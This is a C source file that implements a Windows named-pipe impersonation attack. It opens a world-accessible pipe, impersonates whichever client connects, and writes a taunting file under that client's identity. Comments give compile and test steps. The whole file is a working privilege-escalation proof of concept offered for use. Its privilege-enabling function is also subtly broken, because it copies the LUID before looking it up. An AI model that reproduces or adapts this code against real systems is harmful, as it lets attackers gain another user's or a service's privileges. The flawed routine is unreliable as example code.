/* Creates a namedpipe \\.\pipe\haxx, then impersonates the client connecting to it.
   User should have SeImpersonatePrivilege
   Hardcoded to write to C:\users\skid\pwn.txt
   compile with mingw - x86_64-w64-mingw32-gcc -D UNICODE NamedpipeCreateFiles.c -o NamedPipeCreateFiles.exe
   To test execute the binary and `echo abc > \\.\pipe\haxx` from the client side
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>

#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")


char Data[] = "Get haxxed m8"; // Change content
LPWSTR fileName = L"C:\\users\\skid\\pwn.txt"; // Change filepath

BOOL EnableWindowsPrivilege(LPCWSTR Privilege)
{
	/* Tries to enable privilege if it is present to the Permissions set.
  https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html */
	LUID luid = {};
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}


int main(int argc, TCHAR *argv)
{

	HANDLE hPipe, hToken, userToken;
	char buffer[1024];
	DWORD dwRead;
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, 1);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
	SECURITY_ATTRIBUTES sa;
	sa.lpSecurityDescriptor = &sd;


	if (EnableWindowsPrivilege(SE_IMPERSONATE_NAME)) {
		printf("Enabled SeImpersonatePrivilege\n");
	}
	else
		printf("Failed to enable SeImpersonatePrivilege\n");

		printf("Starting server\n");

		hPipe = CreateNamedPipe(L"\\\\.\\pipe\\haxx", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, &sa);

		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
			printf("Connected to client\n");

		if (!ReadFile(hPipe, &buffer, 1, &dwRead, NULL)) {
			printf("Read failed\n");
			exit(1);
		}

		printf("Impersonating...\n");

		if (ImpersonateNamedPipeClient(hPipe) != TRUE) {
			printf("Failed to impersonate client\n");
			exit(1);
		}
		else {

			HANDLE hFile; 
			DWORD dwBytesWritten = 0;
			BOOL bErrorFlag = FALSE;
			DWORD dwBytesToWrite = (DWORD)strlen(Data);
			printf("Successfully impersonated client, writing file now...%s\n", fileName );


			hFile = CreateFile(fileName,                
				       GENERIC_WRITE,          
				       0,                      
				       NULL,                   
				       CREATE_NEW,             
				       FILE_ATTRIBUTE_NORMAL,  
				       NULL);                  

			if (hFile == INVALID_HANDLE_VALUE) 
			{ 
			    printf("Unable to open file for write.\n");
			    return 1;
			}

			printf("Writing %d bytes to %s \n", dwBytesToWrite, fileName);

			bErrorFlag = WriteFile( 
				    hFile,           
				    Data,      
				    dwBytesToWrite,  
				    &dwBytesWritten,  
				    NULL);           

			if (FALSE == bErrorFlag)
			{
			    printf("Unable to write to file.\n");
			}
			else
			{
			    if (dwBytesWritten != dwBytesToWrite)
			    {
				printf("Error: incomplete write\n");
			    }
			    else
			    {
			       printf("Written successfully.\n");
			    }
			}




		}

	DisconnectNamedPipe(hPipe);

	return 0;
}


